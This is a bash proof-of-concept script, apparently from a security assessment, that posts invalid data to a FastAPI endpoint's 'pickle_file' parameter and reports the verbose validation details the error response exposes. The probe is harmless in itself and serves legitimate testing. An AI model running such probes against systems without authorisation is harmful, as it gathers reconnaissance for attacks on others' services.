#!/bin/bash

# POC: Information Disclosure Through Verbose Validation Error Messages
# This script demonstrates how the API exposes implementation details
# through verbose FastAPI validation error responses

TARGET_URL="${1:-http://localhost:8080}"

echo "=========================================="
echo "Verbose Validation Error Information Disclosure POC"
echo "=========================================="
echo ""

# Test 1: Send invalid pickle file to POST / endpoint
echo "[*] Test 1: Sending invalid content to pickle_file parameter"
echo "[*] Command: curl -X POST ${TARGET_URL}/ -F 'pickle_file=invalid_pickle_content'"
echo ""

RESPONSE=$(curl -s -X POST "${TARGET_URL}/" -F "pickle_file=invalid_pickle_content" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo "[*] Response Body:"
echo "$BODY" | jq . 2>/dev/null || echo "$BODY"
echo ""

# Parse and display exposed information
if echo "$BODY" | jq . >/dev/null 2>&1; then
    echo "[+] INFORMATION DISCLOSURE FOUND:"
    echo ""
    
    # Extract validation type
    VALIDATION_TYPE=$(echo "$BODY" | jq -r '.[0].type' 2>/dev/null)
    if [ ! -z "$VALIDATION_TYPE" ] && [ "$VALIDATION_TYPE" != "null" ]; then
        echo "    [✓] Exposed Validation Type: $VALIDATION_TYPE"
    fi
    
    # Extract parameter location
    PARAM_LOC=$(echo "$BODY" | jq -r '.[0].loc[]' 2>/dev/null | tr '\n' ' ')
    if [ ! -z "$PARAM_LOC" ]; then
        echo "    [✓] Exposed Parameter Location: $PARAM_LOC"
    fi
    
    # Extract error message containing type information
    ERROR_MSG=$(echo "$BODY" | jq -r '.[0].msg' 2>/dev/null)
    if [ ! -z "$ERROR_MSG" ] && [ "$ERROR_MSG" != "null" ]; then
        echo "    [✓] Exposed Error Message: $ERROR_MSG"
        
        # Check if message contains type information
        if echo "$ERROR_MSG" | grep -q "class"; then
            echo "    [!] Message reveals Python class information"
        fi
        if echo "$ERROR_MSG" | grep -q "Expected"; then
            echo "    [!] Message reveals expected type information"
        fi
    fi
    
    # Extract input value
    INPUT_VAL=$(echo "$BODY" | jq -r '.[0].input' 2>/dev/null)
    if [ ! -z "$INPUT_VAL" ] && [ "$INPUT_VAL" != "null" ]; then
        echo "    [✓] Exposed Raw Input Value: $INPUT_VAL"
    fi
    
    # Extract context (if available)
    CONTEXT=$(echo "$BODY" | jq '.[0].ctx' 2>/dev/null)
    if [ ! -z "$CONTEXT" ] && [ "$CONTEXT" != "null" ]; then
        echo "    [✓] Exposed Error Context: $CONTEXT"
    fi
    
    echo ""
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    The API returns detailed error information that reveals:"
    echo "    - Validation logic and expected types"
    echo "    - Exact parameter locations"
    echo "    - Raw input values"
    echo "    - Error context and implementation details"
    echo ""
    exit 0
else
    echo "[-] Could not parse response as JSON"
    echo "[-] Response may indicate different behavior"
    exit 1
fi